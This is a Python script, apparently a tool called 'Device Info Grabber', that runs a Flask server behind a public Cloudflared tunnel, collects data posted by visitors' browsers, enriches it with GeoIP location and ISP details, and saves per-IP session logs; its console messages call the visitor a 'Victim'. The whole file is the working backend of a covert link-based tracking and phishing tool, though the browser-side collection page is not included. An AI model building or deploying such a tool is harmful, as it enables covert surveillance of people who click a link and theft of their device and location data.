#!/usr/bin/env python3

import os
import sys
import time
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
from flask import Flask, request, jsonify
from threading import Thread
from datetime import datetime
import json
from pathlib import Path
import re
import requests

console = Console()
app = Flask(__name__, static_folder="static")
logs_dir = Path("logs")
logs_dir.mkdir(exist_ok=True)

live_sessions = {}
session_logs = {}
saved_logs = set()

@app.route("/")
def index():
    return app.send_static_file("index.html")

@app.route("/save", methods=["POST"])
def save():
    try:
        data = request.get_json()
        ip = request.remote_addr.replace(":", "-")
        now = datetime.now()

        # GeoIP info
        geo_data = fetch_geoip(ip)
        if geo_data:
            data["geo"] = geo_data

        if ip not in live_sessions:
            live_sessions[ip] = {"start": now, "end": now}
            session_logs[ip] = {"start_time": now}
            console.print(f"[yellow][!][/yellow] Victim Opened The Link [{now.strftime('%H:%M:%S')}] — IP: {ip}")
        else:
            live_sessions[ip]["end"] = now

        session = live_sessions[ip]
        duration = (session["end"] - session["start"]).total_seconds()
        data["session"] = {
            "start": session["start"].strftime("%Y-%m-%d %H:%M:%S"),
            "end": session["end"].strftime("%Y-%m-%d %H:%M:%S"),
            "duration_seconds": duration
        }

        session_logs[ip]["end_time"] = now
        session_logs[ip]["duration"] = duration

        # Save only once per IP
        if ip not in saved_logs:
            timestamp = now.strftime("%Y%m%d-%H%M%S")
            log_file = logs_dir / f"{ip}_{timestamp}.json"
            with open(log_file, "w") as f:
                json.dump(data, f, indent=2)
            saved_logs.add(ip)
            console.print(f"[green][+][/green] Logs saved: {log_file.name}")

        return jsonify({"status": "success"})
    except Exception as e:
        console.log(f"[red][!][/red] Error saving data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

def fetch_geoip(ip):
    try:
        if ip.startswith("127") or ip.startswith("0"):
            return None
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "country": res.get("country"),
            "region": res.get("regionName"),
            "city": res.get("city"),
            "isp": res.get("isp"),
        }
    except:
        return None

def check_dependencies():
    console.print("[*] Checking dependencies...", style="bold yellow")
    try:
        import flask, rich, waitress, requests
    except ImportError:
        console.print("[!] Dependencies missing. Installing in virtual environment...", style="bold red")
        subprocess.check_call([sys.executable, "-m", "venv", ".venv"])
        pip_path = ".venv/bin/pip"
        subprocess.check_call([pip_path, "install", "rich", "flask", "waitress", "requests"])
        console.print("[green][+] Installed required packages.[/green]")
        os.execv(".venv/bin/python", [".venv/bin/python"] + sys.argv)

def start_flask():
    from waitress import serve
    serve(app, host="0.0.0.0", port=5000)

def start_cloudflared():
    console.print("[*] Starting Cloudflared tunnel...", style="bold yellow")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    try:
        for line in process.stdout:
            match = re.search(r"https://[\w.-]+\.trycloudflare\.com", line)
            if match:
                console.print(f"[green]\n[+] Public URL:[/green] {match.group(0)}")
                break
    except Exception as e:
        console.print(f"[red][!][/red] Cloudflared error: {e}")

def main():
    os.system("clear")
    console.print(Panel("\U0001F4E1 [bold cyan]Device Info Grabber[/bold cyan]", box=box.ROUNDED))

    check_dependencies()

    console.print("\n[bold white]\U0001F50C Choose mode:[/bold white]")
    console.print("[cyan]1[/cyan]: localhost")
    console.print("[cyan]2[/cyan]: public")

    choice = Prompt.ask("Enter choice", choices=["1", "2"])

    flask_thread = Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()

    time.sleep(2)

    if choice == "1":
        console.print("\n[green][+] Running at:[/green] http://localhost:5000")
    else:
        start_cloudflared()

    try:
        while True:
            time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[red]Exiting...[/red]")
        sys.exit()

if __name__ == "__main__":
    main()